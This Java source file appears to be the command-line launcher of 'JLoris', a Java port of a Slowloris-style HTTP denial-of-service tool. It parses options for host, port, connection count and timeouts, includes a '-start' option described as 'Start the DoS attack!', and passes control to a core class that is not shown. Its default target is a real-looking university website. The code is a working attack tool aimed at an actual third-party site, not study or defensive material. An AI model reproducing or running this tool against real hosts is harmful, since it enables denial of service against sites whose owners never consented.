package test;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.GnuParser;
import org.apache.commons.cli.ParseException;

public class JLoris {

	public String getHost() {
		return host;
	}

	public boolean isHelp() {
		return help;
	}
	
	public boolean isStarted() {
		return start;
	}

	public boolean isVersion() {
		return version;
	}

	public int getPort() {
		return port;
	}

	public int getTimeout() {
		return timeout;
	}

	public int getTcpto() {
		return tcpto;
	}

	public int getConnections() {
		return connections;
	}

	public boolean isHttpready() {
		return httpready;
	}

	public boolean isCache() {
		return cache;
	}
	
	public Options getOptions() {
		return options;
	}
	

	private String host = "www.jntuh.ac.in";
	private int port = 80;
	private int timeout = 100 * 1000;
	private int tcpto = 5 * 1000;
	private int connections = 50;
	private boolean httpready = false;
	private boolean cache = false;
	private boolean help = false;
	private boolean version = false;
	public Options options = null;
	private boolean start = false;
	

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		JLoris ot = new JLoris();
		ot.init();
		ot.parse(args);
		JLorisCore test = new JLorisCore(ot);
		test.init();
		if(ot.isStarted())
			test.start();
	}

	private void parse(String[] args) {
		CommandLineParser parser = new GnuParser();
		try {
			// parse the command line arguments
			CommandLine line = parser.parse(options, args);
			if (line.hasOption("host")) {
				this.host = line.getOptionValue("host");
			}
			if (line.hasOption("help")) {
				this.help = true;
			}
			if (line.hasOption("version")) {
				this.version = true;
			}
			if (line.hasOption("port")) {
				this.port = Integer.parseInt(line.getOptionValue("port"));
			}
			if (line.hasOption("num")) {
				this.connections = Integer.parseInt(line
						.getOptionValue("num"));
			}
			if (line.hasOption("timeout")) {
				this.timeout = Integer.parseInt(line.getOptionValue("timeout"));
			}
			if (line.hasOption("tcpto")) {
				this.tcpto = Integer.parseInt(line.getOptionValue("tcpto"));
			}
			if (line.hasOption("httpready")) {
				this.httpready = true;
			}
			if (line.hasOption("cache")) {
				this.cache = true;
			}
			if (line.hasOption("start")) {
				this.start  = true;
			}

		} catch (ParseException exp) {
			// oops, something went wrong
			System.err.println("Parsing failed.  Reason: " + exp.getMessage());
		}

	}

	private void init() {

		Option help = new Option("help", "Display help");
		Option version = new Option("version", "Version of this tool");
		Option httpready = new Option("httpready", "HTTP Method to be used");
		Option cache = new Option("cache", "Randomize request pattern");
		Option start = new Option("start", "Start the DoS attack!");

		Option host = OptionBuilder.withArgName("hostname").hasArg()
				.withDescription("Hostname").create("host");
		Option port = OptionBuilder.withArgName("number").hasArg()
				.withDescription("Port Number").create("port");
		Option timeout = OptionBuilder.withArgName("seconds").hasArg()
				.withDescription("Timeout for connections").create("timeout");
		Option tcpto = OptionBuilder.withArgName("seconds").hasArg()
				.withDescription("Timeout for TCP socket connetion")
				.create("tcpto");
		Option connections = OptionBuilder.withArgName("i").hasArg()
				.withDescription("No of connetions to be made")
				.create("num");

		Options options = new Options();

		options.addOption(help);
		options.addOption(version);
		options.addOption(httpready);
		options.addOption(cache);
		options.addOption(host);
		options.addOption(port);
		options.addOption(timeout);
		options.addOption(tcpto);
		options.addOption(connections);
		options.addOption(start);

		this.options = options;
	}

}